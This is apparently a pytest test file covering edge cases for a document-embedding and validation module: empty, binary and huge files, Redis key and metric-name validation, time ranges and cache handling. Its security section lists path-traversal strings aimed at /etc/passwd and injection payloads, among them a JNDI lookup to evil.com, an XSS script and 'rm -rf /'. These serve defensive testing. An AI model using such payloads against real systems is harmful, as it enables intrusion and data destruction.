#!/usr/bin/env python3
"""
Edge case and error condition tests
Tests for boundary conditions, error handling, and unusual scenarios
"""

import json
import os
import tempfile
from datetime import datetime, timedelta
from pathlib import Path
from unittest.mock import Mock, patch

import pytest
import yaml

try:
    from hypothesis import given, settings
    from hypothesis import strategies as st

    HAS_HYPOTHESIS = True
except ImportError:
    HAS_HYPOTHESIS = False

    # Mock for when hypothesis is not installed
    def given(*args, **kwargs):
        def decorator(func):
            return pytest.mark.skip(reason="hypothesis not installed")(func)

        return decorator

    class st:
        @staticmethod
        def text(*args, **kwargs):
            pass

        @staticmethod
        def datetimes(*args, **kwargs):
            pass


from src.storage.hash_diff_embedder import HashDiffEmbedder
from src.validators.kv_validators import (
    sanitize_metric_name,
    validate_redis_key,
    validate_time_range,
)


class TestBoundaryConditions:
    """Test boundary conditions and edge cases"""

    def test_empty_file_handling(self) -> None:
        """Test handling of empty files"""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".yaml") as f:
            f.write("")
            f.flush()

            # Test YAML parsing of empty file
            with open(f.name) as file:
                content = yaml.safe_load(file)
            assert content is None, "Empty file should parse as None"

    def test_huge_file_handling(self) -> None:
        """Test handling of very large files"""
        # Create a file with 10MB of data
        large_content = "x" * (10 * 1024 * 1024)

        embedder = HashDiffEmbedder()

        # Should handle large files without memory errors
        hash_value = embedder._compute_content_hash(large_content)
        assert len(hash_value) == 64, "Large files should still produce valid hash"

    def test_binary_file_handling(self) -> None:
        """Test handling of binary files"""
        with tempfile.NamedTemporaryFile(mode="wb", suffix=".bin") as f:
            # Write binary data
            f.write(b"\x00\x01\x02\x03\xff\xfe\xfd")
            f.flush()

            # Test reading binary as text (should fail gracefully)
            try:
                with open(f.name, "r") as file:
                    file.read()
                assert False, "Should not reach here"
            except UnicodeDecodeError:
                pass  # Expected

    def test_special_characters_in_paths(self) -> None:
        """Test handling of special characters in file paths"""
        special_names = [
            "file with spaces.yaml",
            "file-with-dashes.yaml",
            "file_with_underscores.yaml",
            "file.multiple.dots.yaml",
            "文件名.yaml",  # Unicode filename
        ]

        for name in special_names:
            with tempfile.TemporaryDirectory() as tmpdir:
                file_path = Path(tmpdir) / name
                file_path.write_text("content: test")

                # Should handle special characters
                assert file_path.exists()
                content = yaml.safe_load(file_path.read_text())
                assert content["content"] == "test"

    def test_concurrent_file_access(self) -> None:
        """Test handling of concurrent file access"""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".yaml", delete=False) as f:
            f.write("test: content")
            temp_path = f.name

        try:
            # Simulate concurrent read/write
            with open(temp_path, "r") as f1:
                content1 = f1.read()

                # Try to write while reading
                with open(temp_path, "a") as f2:
                    f2.write("\nmore: content")

                # Original read should still work
                assert "test: content" in content1
        finally:
            os.unlink(temp_path)


class TestErrorRecovery:
    """Test error recovery and graceful degradation"""

    def test_network_timeout_handling(self) -> None:
        """Test handling of network timeouts"""
        with patch("qdrant_client.QdrantClient") as mock_client:
            mock_client.side_effect = TimeoutError("Connection timeout")

            embedder = HashDiffEmbedder()
            embedder.config = {"qdrant": {"host": "localhost", "port": 6333}}

            result = embedder.connect()
            assert result is False, "Should return False on timeout"

    def test_disk_full_handling(self) -> None:
        """Test handling of disk full errors"""
        embedder = HashDiffEmbedder()

        # Mock both directory creation and file opening to simulate disk full error
        with (
            patch("pathlib.Path.mkdir"),
            patch("builtins.open", side_effect=OSError("No space left on device")),
        ):
            # The method doesn't handle errors internally, so it will raise
            with pytest.raises(OSError, match="No space left on device"):
                embedder._save_hash_cache()

    def test_invalid_json_recovery(self) -> None:
        """Test recovery from invalid JSON"""
        invalid_json_samples = [
            '{"key": "value"',  # Missing closing brace
            '{"key": "value",}',  # Trailing comma
            "{'key': 'value'}",  # Single quotes
            '{"key": undefined}',  # Undefined value
            '{"key": Infinity}',  # Infinity value
        ]

        failed_count = 0
        for invalid in invalid_json_samples:
            try:
                json.loads(invalid)
            except json.JSONDecodeError:
                failed_count += 1

        # At least 4 out of 5 should fail (Infinity/NaN might be accepted)
        assert failed_count >= 4, f"Only {failed_count} samples failed, expected at least 4"

    def test_partial_write_recovery(self) -> None:
        """Test recovery from partial writes"""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".yaml", delete=False) as f:
            # Write partial YAML
            f.write("key: value\n")
            f.write("incomplete:")  # No value
            temp_path = f.name

        try:
            # Should handle partial/incomplete YAML
            with open(temp_path) as file:
                try:
                    content = yaml.safe_load(file)
                    # Some YAML parsers might accept this
                    assert isinstance(content, dict)
                except yaml.YAMLError:
                    pass  # Also acceptable
        finally:
            os.unlink(temp_path)


class TestValidationEdgeCases:
    """Test validation edge cases"""

    def test_validate_redis_key_edge_cases(self) -> None:
        """Test Redis key validation edge cases"""
        edge_cases = [
            ("", False),  # Empty key
            ("a" * 1024, True),  # Maximum length key
            ("a" * 1025, False),  # Too long
            ("key:with:colons", True),  # Colons allowed
            ("key with spaces", True),  # Spaces ARE allowed (no control chars)
            ("key\nwith\nnewlines", False),  # Newlines not allowed (control char)
            ("key\twith\ttabs", False),  # Tabs not allowed (control char)
            ("válid_ünicode", True),  # Unicode allowed
            ("🔑", True),  # Emoji allowed
        ]

        for key, expected in edge_cases:
            result = validate_redis_key(key)
            assert result == expected, f"Key '{key}' validation failed"

    def test_validate_metric_name_edge_cases(self) -> None:
        """Test metric name sanitization edge cases"""
        edge_cases = [
            ("metric.name", "metric.name"),
            ("metric name", "metric_name"),  # Spaces to underscores
            ("metric-name", "metric-name"),  # Dashes are allowed
            ("METRIC.NAME", "METRIC.NAME"),  # Case preserved
            ("metric..name", "metric..name"),  # Dots preserved
            ("...metric", "...metric"),  # Leading dots preserved
            ("metric...", "metric..."),  # Trailing dots preserved
            ("123metric", "123metric"),  # Numbers allowed
            ("метрика", "_______"),  # Non-ASCII to underscores (7 chars)
        ]

        for input_name, expected in edge_cases:
            result = sanitize_metric_name(input_name)
            assert result == expected, f"Sanitization of '{input_name}' failed"

    def test_validate_time_range_edge_cases(self) -> None:
        """Test time range validation edge cases"""
        now = datetime.utcnow()

        edge_cases = [
            (now, now, False),  # Same time (zero duration) - not allowed
            (now, now - timedelta(seconds=1), False),  # End before start
            (now - timedelta(days=30), now, True),  # 30 days - within default limit
            (now - timedelta(days=91), now, False),  # 91 days - exceeds default 90 day limit
            (None, now, False),  # None start
            (now, None, False),  # None end
        ]

        for start, end, expected in edge_cases:
            try:
                result = validate_time_range(start, end)
                assert result == expected
            except (TypeError, AttributeError):
                assert not expected  # Should fail for None values

    if HAS_HYPOTHESIS:

        @given(st.text())
        def test_redis_key_property(self, key) -> None:
            """Property: validation should be deterministic and handle all strings"""
            # Should not raise exceptions
            try:
                result = validate_redis_key(key)
                # If valid, key should not contain control characters
                if result:
                    assert all(
                        ord(c) >= 32 for c in key
                    ), "Valid keys should not have control chars"
                    assert len(key) <= 1024, "Valid keys should not exceed 1024 chars"
                    assert key != "", "Valid keys should not be empty"
            except Exception as e:
                pytest.fail(f"validate_redis_key raised unexpected exception: {e}")

        @given(st.text())
        @settings(max_examples=200)
        def test_metric_name_sanitization_property(self, name) -> None:
            """Property: sanitization should always produce valid metric names"""
            sanitized = sanitize_metric_name(name)

            # Properties that should always hold
            assert isinstance(sanitized, str), "Should always return a string"
            assert len(sanitized) <= 100, "Should limit length to 100 characters"
            assert len(sanitized) <= len(name), "Should never increase length"

            # Check each character transformation
            for i, char in enumerate(sanitized):
                original = name[i]
                # Characters that are replaced with underscore:
                # - Non-ASCII (ord > 127)
                # - Spaces
                # - Any character not in [a-zA-Z0-9_.-]
                if (
                    ord(original) > 127
                    or original == " "
                    or not (original.isalnum() or original in "_.-")
                ):
                    assert char == "_", f"Invalid char '{original}' at {i} should be underscore"
                else:
                    assert char == original, f"Valid char '{original}' at {i} should be preserved"

        @given(
            st.datetimes(min_value=datetime(2020, 1, 1), max_value=datetime(2030, 1, 1)),
            st.datetimes(min_value=datetime(2020, 1, 1), max_value=datetime(2030, 1, 1)),
        )
        def test_time_range_validation_property(self, start, end) -> None:
            """Property: validation should handle all datetime pairs consistently"""
            try:
                result = validate_time_range(start, end)

                if result:
                    # Valid ranges must have end > start
                    assert end > start, "Valid ranges must have end after start"
                    # Valid ranges must be within limits (90 days by default)
                    assert (end - start).days <= 90, "Valid ranges must be within 90 days"
                else:
                    # Invalid ranges: end <= start, exceeds limit, or future dates
                    from datetime import datetime

                    now = datetime.utcnow()
                    assert end <= start or (end - start).days > 90 or end > now

            except Exception as e:
                pytest.fail(f"validate_time_range raised unexpected exception: {e}")


class TestConcurrencyAndRaceConditions:
    """Test concurrent operations and race conditions"""

    def test_concurrent_hash_cache_access(self) -> None:
        """Test concurrent access to hash cache"""
        embedder = HashDiffEmbedder()
        # Clear any existing cache to ensure test isolation
        embedder.hash_cache = {}

        # Simulate concurrent reads and writes
        with patch.object(embedder, "_save_hash_cache"):
            # Add entries from multiple "threads"
            for i in range(10):
                embedder.hash_cache[f"doc_{i}"] = Mock()

            # Should handle concurrent modifications
            assert len(embedder.hash_cache) == 10, (
                f"Expected exactly 10 cache entries, but found {len(embedder.hash_cache)}: "
                f"{list(embedder.hash_cache.keys())}"
            )

    def test_file_lock_contention(self) -> None:
        """Test file lock contention scenarios"""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".lock", delete=False) as f:
            lock_path = f.name

        try:
            # Simulate lock file exists
            Path(lock_path).touch()

            # Operations should handle existing locks
            assert Path(lock_path).exists()

            # Clean up
            Path(lock_path).unlink()
        except Exception:
            pass  # Cleanup best effort


class TestPerformanceEdgeCases:
    """Test performance-related edge cases"""

    def test_memory_efficient_large_data(self) -> None:
        """Test memory-efficient handling of large data"""
        # Instead of loading entire file into memory
        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt") as f:
            # Write moderate amount of data for faster tests
            for i in range(10000):  # Reduced from 1M to 10K
                f.write(f"Line {i}\n")
            f.flush()

            # Read in chunks
            chunk_size = 1024 * 1024  # 1MB chunks
            chunks_read = 0

            with open(f.name, "r") as file:
                while True:
                    _ = file.read(chunk_size)
                    if not _:
                        break
                    chunks_read += 1
                    if chunks_read > 100:  # Safety limit
                        break

            assert chunks_read > 0, "Should read at least one chunk"

    def test_cache_overflow_handling(self) -> None:
        """Test cache overflow scenarios"""
        embedder = HashDiffEmbedder()

        # Add entries to cache (reduced for faster tests)
        max_cache_size = 1000  # Reduced from 10K
        for i in range(max_cache_size + 100):
            embedder.hash_cache[f"doc_{i}"] = Mock()

        # Should handle large caches
        assert len(embedder.hash_cache) > max_cache_size

        # In real implementation, might want to implement LRU eviction
        # This is just testing it doesn't crash with large caches


class TestSecurityEdgeCases:
    """Test security-related edge cases"""

    def test_path_traversal_prevention(self) -> None:
        """Test prevention of path traversal attacks"""
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
            "C:\\Windows\\System32",
            "~/../../etc/passwd",
        ]

        base_dir = Path(tempfile.gettempdir())

        for dangerous in dangerous_paths:
            # Should not allow accessing files outside base directory
            try:
                full_path = base_dir / dangerous
                # Resolve to catch traversal
                resolved = full_path.resolve()

                # Check if still within base directory
                assert not str(resolved).startswith(str(base_dir.resolve()))
            except Exception:
                pass  # Some paths might not resolve

    def test_injection_prevention(self) -> None:
        """Test prevention of injection attacks"""
        dangerous_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('XSS')</script>",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",  # Template injection
            "`rm -rf /`",  # Command injection
        ]

        # Just validate that dangerous inputs are strings
        for dangerous in dangerous_inputs:
            # Should safely handle dangerous inputs
            # In real implementation, these should be escaped/sanitized
            assert isinstance(dangerous, str)  # Basic type check


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
